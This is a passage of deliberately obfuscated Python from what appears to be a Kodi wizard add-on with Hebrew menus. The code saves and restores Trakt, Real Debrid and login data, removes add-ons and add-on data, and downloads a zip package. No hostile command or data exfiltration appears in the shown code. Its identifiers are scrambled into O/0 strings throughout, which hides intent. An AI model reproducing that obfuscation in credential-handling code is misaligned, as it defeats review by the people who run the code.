	addFile ('%s שמירת פליליסט לאודר:  '%O0OOOOOOOO0OOO000 .replace ('true',OO0O0OO000O00OOO0 ).replace ('false',O0O0OO0O0O0OOO0OO ),'togglesetting','keepplaylist',icon =ICONTRAKT ,themeit =THEME1 )#line:3161
	addFile ('%s שמירת הגדרות באפר: '%OOOOO0O0OO0000OOO .replace ('true',OO0O0OO000O00OOO0 ).replace ('false',O0O0OO0O0O0OOO0OO ),'togglesetting','keepadvanced',icon =ICONSAVE ,themeit =THEME1 )#line:3166
	addFile ('%s שמירת רשימות ריפו:  '%OO0OOO0OOO00O0OO0 .replace ('true',OO0O0OO000O00OOO0 ).replace ('false',O0O0OO0O0O0OOO0OO ),'togglesetting','keeprepos',icon =ICONSAVE ,themeit =THEME1 )#line:3168
	setView ('files','viewType')#line:3170
def traktMenu ():#line:3172
	O0OOO0OO0OO00O0O0 ='[COLOR green]מופעל[/COLOR]'if KEEPTRAKT =='true'else '[COLOR red]מבוטל[/COLOR]'#line:3173
	OOO00O0OOOOOOO0OO =str (TRAKTSAVE )if not TRAKTSAVE ==''else 'Trakt hasnt been saved yet.'#line:3174
	addFile ('[I]Register FREE Account at http://trakt.tv[/I]','',icon =ICONTRAKT ,themeit =THEME3 )#line:3175
	addFile ('Save Trakt Data: %s'%O0OOO0OO0OO00O0O0 ,'togglesetting','keeptrakt',icon =ICONTRAKT ,themeit =THEME3 )#line:3176
	if KEEPTRAKT =='true':addFile ('Last Save: %s'%str (OOO00O0OOOOOOO0OO ),'',icon =ICONTRAKT ,themeit =THEME3 )#line:3177
	if HIDESPACERS =='No':addFile (wiz .sep (),'',icon =ICONTRAKT ,themeit =THEME3 )#line:3178
	for O0OOO0OO0OO00O0O0 in traktit .ORDER :#line:3180
		OOOOO0000O00O00OO =TRAKTID [O0OOO0OO0OO00O0O0 ]['name']#line:3181
		OO0O0OOO00O0OOOO0 =TRAKTID [O0OOO0OO0OO00O0O0 ]['path']#line:3182
		OOO00O00O000O00O0 =TRAKTID [O0OOO0OO0OO00O0O0 ]['saved']#line:3183
		O0OOO0O0O0OOO0OOO =TRAKTID [O0OOO0OO0OO00O0O0 ]['file']#line:3184
		OOO0OOO0O0O0O0000 =wiz .getS (OOO00O00O000O00O0 )#line:3185
		OOO00OOOO0O000OO0 =traktit .traktUser (O0OOO0OO0OO00O0O0 )#line:3186
		O000000O0OOO00000 =TRAKTID [O0OOO0OO0OO00O0O0 ]['icon']if os .path .exists (OO0O0OOO00O0OOOO0 )else ICONTRAKT #line:3187
		OO0O0O00O0O0OOOOO =TRAKTID [O0OOO0OO0OO00O0O0 ]['fanart']if os .path .exists (OO0O0OOO00O0OOOO0 )else FANART #line:3188
		OO0OO0OO00OOOO0OO =createMenu ('saveaddon','Trakt',O0OOO0OO0OO00O0O0 )#line:3189
		O0OOO0000OO0OOO00 =createMenu ('save','Trakt',O0OOO0OO0OO00O0O0 )#line:3190
		OO0OO0OO00OOOO0OO .append ((THEME2 %'%s Settings'%OOOOO0000O00O00OO ,'RunPlugin(plugin://%s/?mode=opensettings&name=%s&url=trakt)'%(ADDON_ID ,O0OOO0OO0OO00O0O0 )))#line:3191
		addFile ('[+]-> %s'%OOOOO0000O00O00OO ,'',icon =O000000O0OOO00000 ,fanart =OO0O0O00O0O0OOOOO ,themeit =THEME3 )#line:3193
		if not os .path .exists (OO0O0OOO00O0OOOO0 ):addFile ('[COLOR red]Addon Data: Not Installed[/COLOR]','',icon =O000000O0OOO00000 ,fanart =OO0O0O00O0O0OOOOO ,menu =OO0OO0OO00OOOO0OO )#line:3194
		elif not OOO00OOOO0O000OO0 :addFile ('[COLOR red]Addon Data: Not Registered[/COLOR]','authtrakt',O0OOO0OO0OO00O0O0 ,icon =O000000O0OOO00000 ,fanart =OO0O0O00O0O0OOOOO ,menu =OO0OO0OO00OOOO0OO )#line:3195
		else :addFile ('[COLOR green]Addon Data: %s[/COLOR]'%OOO00OOOO0O000OO0 ,'authtrakt',O0OOO0OO0OO00O0O0 ,icon =O000000O0OOO00000 ,fanart =OO0O0O00O0O0OOOOO ,menu =OO0OO0OO00OOOO0OO )#line:3196
		if OOO0OOO0O0O0O0000 =="":#line:3197
			if os .path .exists (O0OOO0O0O0OOO0OOO ):addFile ('[COLOR red]Saved Data: Save File Found(Import Data)[/COLOR]','importtrakt',O0OOO0OO0OO00O0O0 ,icon =O000000O0OOO00000 ,fanart =OO0O0O00O0O0OOOOO ,menu =O0OOO0000OO0OOO00 )#line:3198
			else :addFile ('[COLOR red]Saved Data: Not Saved[/COLOR]','savetrakt',O0OOO0OO0OO00O0O0 ,icon =O000000O0OOO00000 ,fanart =OO0O0O00O0O0OOOOO ,menu =O0OOO0000OO0OOO00 )#line:3199
		else :addFile ('[COLOR green]Saved Data: %s[/COLOR]'%OOO0OOO0O0O0O0000 ,'',icon =O000000O0OOO00000 ,fanart =OO0O0O00O0O0OOOOO ,menu =O0OOO0000OO0OOO00 )#line:3200
	if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:3202
	addFile ('Save All Trakt Data','savetrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:3203
	addFile ('Recover All Saved Trakt Data','restoretrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:3204
	addFile ('Import Trakt Data','importtrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:3205
	addFile ('Clear All Saved Trakt Data','cleartrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:3206
	addFile ('Clear All Addon Data','addontrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:3207
	setView ('files','viewType')#line:3208
def realMenu ():#line:3210
	O0O0O0O0OOO0OOOO0 ='[COLOR green]ON[/COLOR]'if KEEPREAL =='true'else '[COLOR red]OFF[/COLOR]'#line:3211
	O00OOO0OO0OO0OOO0 =str (REALSAVE )if not REALSAVE ==''else 'Real Debrid hasnt been saved yet.'#line:3212
	addFile ('[I]http://real-debrid.com is a PAID service.[/I]','',icon =ICONREAL ,themeit =THEME3 )#line:3213
	addFile ('Save Real Debrid Data: %s'%O0O0O0O0OOO0OOOO0 ,'togglesetting','keepdebrid',icon =ICONREAL ,themeit =THEME3 )#line:3214
	if KEEPREAL =='true':addFile ('Last Save: %s'%str (O00OOO0OO0OO0OOO0 ),'',icon =ICONREAL ,themeit =THEME3 )#line:3215
	if HIDESPACERS =='No':addFile (wiz .sep (),'',icon =ICONREAL ,themeit =THEME3 )#line:3216
	for O0OO0O0O00OO0O00O in debridit .ORDER :#line:3218
		O000O0O00O0OOO0OO =DEBRIDID [O0OO0O0O00OO0O00O ]['name']#line:3219
		OOO00OOO0OO0O00O0 =DEBRIDID [O0OO0O0O00OO0O00O ]['path']#line:3220
		OO00O00OOOOO00O0O =DEBRIDID [O0OO0O0O00OO0O00O ]['saved']#line:3221
		OOO0000OOOO0O0OO0 =DEBRIDID [O0OO0O0O00OO0O00O ]['file']#line:3222
		O0O00OO0O0OOO00O0 =wiz .getS (OO00O00OOOOO00O0O )#line:3223
		OOO00O0O0OO00OO00 =debridit .debridUser (O0OO0O0O00OO0O00O )#line:3224
		O000OO0000O0OOO0O =DEBRIDID [O0OO0O0O00OO0O00O ]['icon']if os .path .exists (OOO00OOO0OO0O00O0 )else ICONREAL #line:3225
		O0OOO00O000O0O000 =DEBRIDID [O0OO0O0O00OO0O00O ]['fanart']if os .path .exists (OOO00OOO0OO0O00O0 )else FANART #line:3226
		O000O0OOO00OOOO0O =createMenu ('saveaddon','Debrid',O0OO0O0O00OO0O00O )#line:3227
		OO0OO0O0000OO0O00 =createMenu ('save','Debrid',O0OO0O0O00OO0O00O )#line:3228
		O000O0OOO00OOOO0O .append ((THEME2 %'%s Settings'%O000O0O00O0OOO0OO ,'RunPlugin(plugin://%s/?mode=opensettings&name=%s&url=debrid)'%(ADDON_ID ,O0OO0O0O00OO0O00O )))#line:3229
		addFile ('[+]-> %s'%O000O0O00O0OOO0OO ,'',icon =O000OO0000O0OOO0O ,fanart =O0OOO00O000O0O000 ,themeit =THEME3 )#line:3231
		if not os .path .exists (OOO00OOO0OO0O00O0 ):addFile ('[COLOR red]Addon Data: Not Installed[/COLOR]','',icon =O000OO0000O0OOO0O ,fanart =O0OOO00O000O0O000 ,menu =O000O0OOO00OOOO0O )#line:3232
		elif not OOO00O0O0OO00OO00 :addFile ('[COLOR red]Addon Data: Not Registered[/COLOR]','authdebrid',O0OO0O0O00OO0O00O ,icon =O000OO0000O0OOO0O ,fanart =O0OOO00O000O0O000 ,menu =O000O0OOO00OOOO0O )#line:3233
		else :addFile ('[COLOR green]Addon Data: %s[/COLOR]'%OOO00O0O0OO00OO00 ,'authdebrid',O0OO0O0O00OO0O00O ,icon =O000OO0000O0OOO0O ,fanart =O0OOO00O000O0O000 ,menu =O000O0OOO00OOOO0O )#line:3234
		if O0O00OO0O0OOO00O0 =="":#line:3235
			if os .path .exists (OOO0000OOOO0O0OO0 ):addFile ('[COLOR red]Saved Data: Save File Found(Import Data)[/COLOR]','importdebrid',O0OO0O0O00OO0O00O ,icon =O000OO0000O0OOO0O ,fanart =O0OOO00O000O0O000 ,menu =OO0OO0O0000OO0O00 )#line:3236
			else :addFile ('[COLOR red]Saved Data: Not Saved[/COLOR]','savedebrid',O0OO0O0O00OO0O00O ,icon =O000OO0000O0OOO0O ,fanart =O0OOO00O000O0O000 ,menu =OO0OO0O0000OO0O00 )#line:3237
		else :addFile ('[COLOR green]Saved Data: %s[/COLOR]'%O0O00OO0O0OOO00O0 ,'',icon =O000OO0000O0OOO0O ,fanart =O0OOO00O000O0O000 ,menu =OO0OO0O0000OO0O00 )#line:3238
	if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:3240
	addFile ('Save All Real Debrid Data','savedebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:3241
	addFile ('Recover All Saved Real Debrid Data','restoredebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:3242
	addFile ('Import Real Debrid Data','importdebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:3243
	addFile ('Clear All Saved Real Debrid Data','cleardebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:3244
	addFile ('Clear All Addon Data','addondebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:3245
	setView ('files','viewType')#line:3246
def loginMenu ():#line:3248
	O00000000OOO0OOO0 ='[COLOR green]ON[/COLOR]'if KEEPLOGIN =='true'else '[COLOR red]OFF[/COLOR]'#line:3249
	O0O0000OOOOOO000O =str (LOGINSAVE )if not LOGINSAVE ==''else 'Login data hasnt been saved yet.'#line:3250
	addFile ('[I]Several of these addons are PAID services.[/I]','',icon =ICONLOGIN ,themeit =THEME3 )#line:3251
	addFile ('Save Login Data: %s'%O00000000OOO0OOO0 ,'togglesetting','keeplogin',icon =ICONLOGIN ,themeit =THEME3 )#line:3252
	if KEEPLOGIN =='true':addFile ('Last Save: %s'%str (O0O0000OOOOOO000O ),'',icon =ICONLOGIN ,themeit =THEME3 )#line:3253
	if HIDESPACERS =='No':addFile (wiz .sep (),'',icon =ICONLOGIN ,themeit =THEME3 )#line:3254
	for O00000000OOO0OOO0 in loginit .ORDER :#line:3256
		OOOOOO00OO0000OO0 =LOGINID [O00000000OOO0OOO0 ]['name']#line:3257
		O00O000O0O00OO0O0 =LOGINID [O00000000OOO0OOO0 ]['path']#line:3258
		OOO0OO00000O0O0O0 =LOGINID [O00000000OOO0OOO0 ]['saved']#line:3259
		O0OO00O0O00OO0O00 =LOGINID [O00000000OOO0OOO0 ]['file']#line:3260
		OO0O000O0OOO0O000 =wiz .getS (OOO0OO00000O0O0O0 )#line:3261
		O0OO0O00O000O0OOO =loginit .loginUser (O00000000OOO0OOO0 )#line:3262
		OOO0O0OO0OO000OO0 =LOGINID [O00000000OOO0OOO0 ]['icon']if os .path .exists (O00O000O0O00OO0O0 )else ICONLOGIN #line:3263
		O00O00OO0O00O0000 =LOGINID [O00000000OOO0OOO0 ]['fanart']if os .path .exists (O00O000O0O00OO0O0 )else FANART #line:3264
		OOOOOO0OOO000O0O0 =createMenu ('saveaddon','Login',O00000000OOO0OOO0 )#line:3265
		OO0O0O000OOOOOO00 =createMenu ('save','Login',O00000000OOO0OOO0 )#line:3266
		OOOOOO0OOO000O0O0 .append ((THEME2 %'%s Settings'%OOOOOO00OO0000OO0 ,'RunPlugin(plugin://%s/?mode=opensettings&name=%s&url=login)'%(ADDON_ID ,O00000000OOO0OOO0 )))#line:3267
		addFile ('[+]-> %s'%OOOOOO00OO0000OO0 ,'',icon =OOO0O0OO0OO000OO0 ,fanart =O00O00OO0O00O0000 ,themeit =THEME3 )#line:3269
		if not os .path .exists (O00O000O0O00OO0O0 ):addFile ('[COLOR red]Addon Data: Not Installed[/COLOR]','',icon =OOO0O0OO0OO000OO0 ,fanart =O00O00OO0O00O0000 ,menu =OOOOOO0OOO000O0O0 )#line:3270
		elif not O0OO0O00O000O0OOO :addFile ('[COLOR red]Addon Data: Not Registered[/COLOR]','authlogin',O00000000OOO0OOO0 ,icon =OOO0O0OO0OO000OO0 ,fanart =O00O00OO0O00O0000 ,menu =OOOOOO0OOO000O0O0 )#line:3271
		else :addFile ('[COLOR green]Addon Data: %s[/COLOR]'%O0OO0O00O000O0OOO ,'authlogin',O00000000OOO0OOO0 ,icon =OOO0O0OO0OO000OO0 ,fanart =O00O00OO0O00O0000 ,menu =OOOOOO0OOO000O0O0 )#line:3272
		if OO0O000O0OOO0O000 =="":#line:3273
			if os .path .exists (O0OO00O0O00OO0O00 ):addFile ('[COLOR red]Saved Data: Save File Found(Import Data)[/COLOR]','importlogin',O00000000OOO0OOO0 ,icon =OOO0O0OO0OO000OO0 ,fanart =O00O00OO0O00O0000 ,menu =OO0O0O000OOOOOO00 )#line:3274
			else :addFile ('[COLOR red]Saved Data: Not Saved[/COLOR]','savelogin',O00000000OOO0OOO0 ,icon =OOO0O0OO0OO000OO0 ,fanart =O00O00OO0O00O0000 ,menu =OO0O0O000OOOOOO00 )#line:3275
		else :addFile ('[COLOR green]Saved Data: %s[/COLOR]'%OO0O000O0OOO0O000 ,'',icon =OOO0O0OO0OO000OO0 ,fanart =O00O00OO0O00O0000 ,menu =OO0O0O000OOOOOO00 )#line:3276
	if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:3278
	addFile ('Save All Login Data','savelogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:3279
	addFile ('Recover All Saved Login Data','restorelogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:3280
	addFile ('Import Login Data','importlogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:3281
	addFile ('Clear All Saved Login Data','clearlogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:3282
	addFile ('Clear All Addon Data','addonlogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:3283
	setView ('files','viewType')#line:3284
def fixUpdate ():#line:3286
	if KODIV <17 :#line:3287
		OO0OO000000OOOOOO =os .path .join (DATABASE ,wiz .latestDB ('Addons'))#line:3288
		try :#line:3289
			os .remove (OO0OO000000OOOOOO )#line:3290
		except Exception as OO0000000OOOOOOOO :#line:3291
			wiz .log ("Unable to remove %s, Purging DB"%OO0OO000000OOOOOO )#line:3292
			wiz .purgeDb (OO0OO000000OOOOOO )#line:3293
	else :#line:3294
		xbmc .log ("Requested Addons.db be removed but doesnt work in Kod17")#line:3295
def removeAddonMenu ():#line:3297
	O00000000OOOO0000 =glob .glob (os .path .join (ADDONS ,'*/'))#line:3298
	OO00OO00O0O0O0O0O =[];OOO0O0O000OO00OOO =[]#line:3299
	for OOOOO00OO00O0OOOO in sorted (O00000000OOOO0000 ,key =lambda O0OO00O0OOO000O00 :O0OO00O0OOO000O00 ):#line:3300
		O0OO0O0OO0O0O00OO =os .path .split (OOOOO00OO00O0OOOO [:-1 ])[1 ]#line:3301
		if O0OO0O0OO0O0O00OO in EXCLUDES :continue #line:3302
		elif O0OO0O0OO0O0O00OO in DEFAULTPLUGINS :continue #line:3303
		elif O0OO0O0OO0O0O00OO =='packages':continue #line:3304
		O000O00OOO0OO000O =os .path .join (OOOOO00OO00O0OOOO ,'addon.xml')#line:3305
		if os .path .exists (O000O00OOO0OO000O ):#line:3306
			OO0O00OO00OO00O00 =open (O000O00OOO0OO000O )#line:3307
			O0O0000O00O0OO0OO =OO0O00OO00OO00O00 .read ()#line:3308
			OOOO0O0OOO00O0O00 =wiz .parseDOM (O0O0000O00O0OO0OO ,'addon',ret ='id')#line:3309
			OO0O00OO0O00O0O00 =O0OO0O0OO0O0O00OO if len (OOOO0O0OOO00O0O00 )==0 else OOOO0O0OOO00O0O00 [0 ]#line:3311
			try :#line:3312
				O0O0OOOO0OOOOO000 =xbmcaddon .Addon (id =OO0O00OO0O00O0O00 )#line:3313
				OO00OO00O0O0O0O0O .append (O0O0OOOO0OOOOO000 .getAddonInfo ('name'))#line:3314
				OOO0O0O000OO00OOO .append (OO0O00OO0O00O0O00 )#line:3315
			except :#line:3316
				pass #line:3317
	if len (OO00OO00O0O0O0O0O )==0 :#line:3318
		wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]No Addons To Remove[/COLOR]"%COLOR2 )#line:3319
		return #line:3320
	if KODIV >16 :#line:3321
		OOO0O000O0O0O0O0O =DIALOG .multiselect ("%s: Select the addons you wish to remove."%ADDONTITLE ,OO00OO00O0O0O0O0O )#line:3322
	else :#line:3323
		OOO0O000O0O0O0O0O =[];OOO0OO0O0O000O000 =0 #line:3324
		OO00OOO000O0000OO =["-- Click here to Continue --"]+OO00OO00O0O0O0O0O #line:3325
		while not OOO0OO0O0O000O000 ==-1 :#line:3326
			OOO0OO0O0O000O000 =DIALOG .select ("%s: Select the addons you wish to remove."%ADDONTITLE ,OO00OOO000O0000OO )#line:3327
			if OOO0OO0O0O000O000 ==-1 :break #line:3328
			elif OOO0OO0O0O000O000 ==0 :break #line:3329
			else :#line:3330
				O0OO00OOO0000O00O =(OOO0OO0O0O000O000 -1 )#line:3331
				if O0OO00OOO0000O00O in OOO0O000O0O0O0O0O :#line:3332
					OOO0O000O0O0O0O0O .remove (O0OO00OOO0000O00O )#line:3333
					OO00OOO000O0000OO [OOO0OO0O0O000O000 ]=OO00OO00O0O0O0O0O [O0OO00OOO0000O00O ]#line:3334
				else :#line:3335
					OOO0O000O0O0O0O0O .append (O0OO00OOO0000O00O )#line:3336
					OO00OOO000O0000OO [OOO0OO0O0O000O000 ]="[B][COLOR %s]%s[/COLOR][/B]"%(COLOR1 ,OO00OO00O0O0O0O0O [O0OO00OOO0000O00O ])#line:3337
	if OOO0O000O0O0O0O0O ==None :return #line:3338
	if len (OOO0O000O0O0O0O0O )>0 :#line:3339
		wiz .addonUpdates ('set')#line:3340
		for OOO0O0O00OOOO000O in OOO0O000O0O0O0O0O :#line:3341
			removeAddon (OOO0O0O000OO00OOO [OOO0O0O00OOOO000O ],OO00OO00O0O0O0O0O [OOO0O0O00OOOO000O ],True )#line:3342
		xbmc .sleep (1000 )#line:3344
		if INSTALLMETHOD ==1 :OO0OOOOOOOO0O0O0O =1 #line:3346
		elif INSTALLMETHOD ==2 :OO0OOOOOOOO0O0O0O =0 #line:3347
		else :OO0OOOOOOOO0O0O0O =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]סיום התקנה [COLOR %s]סגירה[/COLOR] או [COLOR %s]הצג נתונים[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,COLOR1 ),yeslabel ="[B][COLOR green]הצג נתונים[/COLOR][/B]",nolabel ="[B][COLOR red]סגירה[/COLOR][/B]")#line:3348
		if OO0OOOOOOOO0O0O0O ==1 :wiz .reloadFix ('remove addon')#line:3349
		else :wiz .addonUpdates ('reset');wiz .killxbmc (True )#line:3350
def removeAddonDataMenu ():#line:3352
	if os .path .exists (ADDOND ):#line:3353
		addFile ('[COLOR red][B][REMOVE][/B][/COLOR] All Addon_Data','removedata','all',themeit =THEME2 )#line:3354
		addFile ('[COLOR red][B][REMOVE][/B][/COLOR] All Addon_Data for Uninstalled Addons','removedata','uninstalled',themeit =THEME2 )#line:3355
		addFile ('[COLOR red][B][REMOVE][/B][/COLOR] All Empty Folders in Addon_Data','removedata','empty',themeit =THEME2 )#line:3356
		addFile ('[COLOR red][B][REMOVE][/B][/COLOR] %s Addon_Data'%ADDONTITLE ,'resetaddon',themeit =THEME2 )#line:3357
		if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:3358
		OO00OO0OO00OO0OOO =glob .glob (os .path .join (ADDOND ,'*/'))#line:3359
		for O00O0OO00000O00OO in sorted (OO00OO0OO00OO0OOO ,key =lambda O0O00000000O0OOO0 :O0O00000000O0OOO0 ):#line:3360
			O0OOOOOO0O00OO000 =O00O0OO00000O00OO .replace (ADDOND ,'').replace ('\\','').replace ('/','')#line:3361
			OOOO00O00O0000000 =os .path .join (O00O0OO00000O00OO .replace (ADDOND ,ADDONS ),'icon.png')#line:3362
			O0OO0O0OO00OOO0OO =os .path .join (O00O0OO00000O00OO .replace (ADDOND ,ADDONS ),'fanart.png')#line:3363
			OO0O0O000O000O000 =O0OOOOOO0O00OO000 #line:3364
			OOO00OO0O000OOO00 ={'audio.':'[COLOR orange][AUDIO] [/COLOR]','metadata.':'[COLOR cyan][METADATA] [/COLOR]','module.':'[COLOR orange][MODULE] [/COLOR]','plugin.':'[COLOR blue][PLUGIN] [/COLOR]','program.':'[COLOR orange][PROGRAM] [/COLOR]','repository.':'[COLOR gold][REPO] [/COLOR]','script.':'[COLOR green][SCRIPT] [/COLOR]','service.':'[COLOR green][SERVICE] [/COLOR]','skin.':'[COLOR dodgerblue][SKIN] [/COLOR]','video.':'[COLOR orange][VIDEO] [/COLOR]','weather.':'[COLOR yellow][WEATHER] [/COLOR]'}#line:3365
			for O0OOO0OO0O0O000OO in OOO00OO0O000OOO00 :#line:3366
				OO0O0O000O000O000 =OO0O0O000O000O000 .replace (O0OOO0OO0O0O000OO ,OOO00OO0O000OOO00 [O0OOO0OO0O0O000OO ])#line:3367
			if O0OOOOOO0O00OO000 in EXCLUDES :OO0O0O000O000O000 ='[COLOR green][B][PROTECTED][/B][/COLOR] %s'%OO0O0O000O000O000 #line:3368
			else :OO0O0O000O000O000 ='[COLOR red][B][REMOVE][/B][/COLOR] %s'%OO0O0O000O000O000 #line:3369
			addFile (' %s'%OO0O0O000O000O000 ,'removedata',O0OOOOOO0O00OO000 ,icon =OOOO00O00O0000000 ,fanart =O0OO0O0OO00OOO0OO ,themeit =THEME2 )#line:3370
	else :#line:3371
		addFile ('No Addon data folder found.','',themeit =THEME3 )#line:3372
	setView ('files','viewType')#line:3373
def enableAddons ():#line:3375
	addFile ("[I][B][COLOR red]!!Notice: Disabling Some Addons Can Cause Issues!![/COLOR][/B][/I]",'',icon =ICONMAINT )#line:3376
	O0000OO0OOOOO0OOO =glob .glob (os .path .join (ADDONS ,'*/'))#line:3377
	OO000OOO00OOO0O0O =0 #line:3378
	for O0OO00000O0OOO00O in sorted (O0000OO0OOOOO0OOO ,key =lambda OOOO000O0000O00O0 :OOOO000O0000O00O0 ):#line:3379
		OOOOO000OO0OO0OOO =os .path .split (O0OO00000O0OOO00O [:-1 ])[1 ]#line:3380
		if OOOOO000OO0OO0OOO in EXCLUDES :continue #line:3381
		if OOOOO000OO0OO0OOO in DEFAULTPLUGINS :continue #line:3382
		OO00OOOOO0OO000OO =os .path .join (O0OO00000O0OOO00O ,'addon.xml')#line:3383
		if os .path .exists (OO00OOOOO0OO000OO ):#line:3384
			OO000OOO00OOO0O0O +=1 #line:3385
			O0000OO0OOOOO0OOO =O0OO00000O0OOO00O .replace (ADDONS ,'')[1 :-1 ]#line:3386
			OO0O0O0O0O000OOO0 =open (OO00OOOOO0OO000OO )#line:3387
			O00000000O00000O0 =OO0O0O0O0O000OOO0 .read ().replace ('\n','').replace ('\r','').replace ('\t','')#line:3388
			OOOOO00000O00OOO0 =wiz .parseDOM (O00000000O00000O0 ,'addon',ret ='id')#line:3389
			O0O0OO0O0O00OOO00 =wiz .parseDOM (O00000000O00000O0 ,'addon',ret ='name')#line:3390
			try :#line:3391
				OO00O00OO0O00OOOO =OOOOO00000O00OOO0 [0 ]#line:3392
				OOO00O00O0OO0OOOO =O0O0OO0O0O00OOO00 [0 ]#line:3393
			except :#line:3394
				continue #line:3395
			try :#line:3396
				O0O00OO0O000OOOO0 =xbmcaddon .Addon (id =OO00O00OO0O00OOOO )#line:3397
				O0OOO0O000OO00O0O ="[COLOR green][Enabled][/COLOR]"#line:3398
				O000OO0O0OOO0O00O ="false"#line:3399
			except :#line:3400
				O0OOO0O000OO00O0O ="[COLOR red][Disabled][/COLOR]"#line:3401
				O000OO0O0OOO0O00O ="true"#line:3402
				pass #line:3403
			OOO000OOO0OOO0O00 =os .path .join (O0OO00000O0OOO00O ,'icon.png')if os .path .exists (os .path .join (O0OO00000O0OOO00O ,'icon.png'))else ICON #line:3404
			OOOO000OO00000O00 =os .path .join (O0OO00000O0OOO00O ,'fanart.jpg')if os .path .exists (os .path .join (O0OO00000O0OOO00O ,'fanart.jpg'))else FANART #line:3405
			addFile ("%s %s"%(O0OOO0O000OO00O0O ,OOO00O00O0OO0OOOO ),'toggleaddon',O0000OO0OOOOO0OOO ,O000OO0O0OOO0O00O ,icon =OOO000OOO0OOO0O00 ,fanart =OOOO000OO00000O00 )#line:3406
			OO0O0O0O0O000OOO0 .close ()#line:3407
	if OO000OOO00OOO0O0O ==0 :#line:3408
		addFile ("No Addons Found to Enable or Disable.",'',icon =ICONMAINT )#line:3409
	setView ('files','viewType')#line:3410
def changeFeq ():#line:3412
	O00OO00O00O000OO0 =['Every Startup','Every Day','Every Three Days','Every Weekly']#line:3413
	O00OO00O000O0O000 =DIALOG .select ("[COLOR %s]How often would you list to Auto Clean on Startup?[/COLOR]"%COLOR2 ,O00OO00O00O000OO0 )#line:3414
	if not O00OO00O000O0O000 ==-1 :#line:3415
		wiz .setS ('autocleanfeq',str (O00OO00O000O0O000 ))#line:3416
		wiz .LogNotify ('[COLOR %s]Auto Clean Up[/COLOR]'%COLOR1 ,'[COLOR %s]Fequency Now %s[/COLOR]'%(COLOR2 ,O00OO00O00O000OO0 [O00OO00O000O0O000 ]))#line:3417
def developer ():#line:3419
	addFile ('Convert Text Files to 0.1.7','converttext',themeit =THEME1 )#line:3420
	addFile ('Create QR Code','createqr',themeit =THEME1 )#line:3421
	addFile ('Test Notifications','testnotify',themeit =THEME1 )#line:3422
	addFile ('Test Update','testupdate',themeit =THEME1 )#line:3423
	addFile ('Test First Run','testfirst',themeit =THEME1 )#line:3424
	addFile ('Test First Run Settings','testfirstrun',themeit =THEME1 )#line:3425
	addFile ('Test APk','testapk',themeit =THEME1 )#line:3426
	setView ('files','viewType')#line:3428
def download (OOOO000O0000OO0O0 ,OO0OOOOO000O00O0O ):#line:3433
  OO00O0OO0OOOO00OO =xbmc .translatePath (os .path .join ('special://home/addons','packages'))#line:3434
  OOO0OOO00O0O00O00 =xbmcgui .DialogProgress ()#line:3435
  OOO0OOO00O0O00O00 .create ("XBMC ISRAEL","Downloading "+name ,'','Please Wait')#line:3436
  O0OO00O00000OOO00 =os .path .join (OO00O0OO0OOOO00OO ,'isr.zip')#line:3437
  O00OO0000O00OO0O0 =urllib2 .Request (OOOO000O0000OO0O0 )#line:3438
  OOOO00000O0O0OO0O =urllib2 .urlopen (O00OO0000O00OO0O0 )#line:3439
  O0O000O00OO000O0O =xbmcgui .DialogProgress ()#line:3441
  O0O000O00OO000O0O .create ("Downloading","Downloading "+name )#line:3442
  O0O000O00OO000O0O .update (0 )#line:3443
  O0O000O0OO0O0000O =OO0OOOOO000O00O0O #line:3444
  O0000O00OO0OO0OOO =open (O0OO00O00000OOO00 ,'wb')#line:3445
  try :#line:3447
    O0O0O00OO00O0OOO0 =OOOO00000O0O0OO0O .info ().getheader ('Content-Length').strip ()#line:3448
    O0000000O0O0OOO0O =True #line:3449
  except AttributeError :#line:3450
        O0000000O0O0OOO0O =False #line:3451
  if O0000000O0O0OOO0O :#line:3453
        O0O0O00OO00O0OOO0 =int (O0O0O00OO00O0OOO0 )#line:3454
  OOO0OOO0000OO0000 =0 #line:3456
  O000O000OO0OOOO00 =time .time ()#line:3457
  while True :#line:3458
        O00OOOO000O00000O =OOOO00000O0O0OO0O .read (8192 )#line:3459
        if not O00OOOO000O00000O :#line:3460
            sys .stdout .write ('\n')#line:3461
            break #line:3462
        OOO0OOO0000OO0000 +=len (O00OOOO000O00000O )#line:3464
        O0000O00OO0OO0OOO .write (O00OOOO000O00000O )#line:3465
        if not O0000000O0O0OOO0O :#line:3467
            O0O0O00OO00O0OOO0 =OOO0OOO0000OO0000 #line:3468
        if O0O000O00OO000O0O .iscanceled ():#line:3469
           O0O000O00OO000O0O .close ()#line:3470
           try :#line:3471
            os .remove (O0OO00O00000OOO00 )#line:3472
           except :#line:3473
            pass #line:3474
           break #line:3475
        O000OO0OOOOO0OO00 =float (OOO0OOO0000OO0000 )/O0O0O00OO00O0OOO0 #line:3476
        O000OO0OOOOO0OO00 =round (O000OO0OOOOO0OO00 *100 ,2 )#line:3477
        OO000OOO00O00OOOO =OOO0OOO0000OO0000 /(1024 *1024 )#line:3478
        O0OO0000OO0O00O0O =O0O0O00OO00O0OOO0 /(1024 *1024 )#line:3479
        O00OO0O0OOO0O000O ='[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]'%('teal','skyblue',OO000OOO00O00OOOO ,'teal',O0OO0000OO0O00O0O )#line:3480
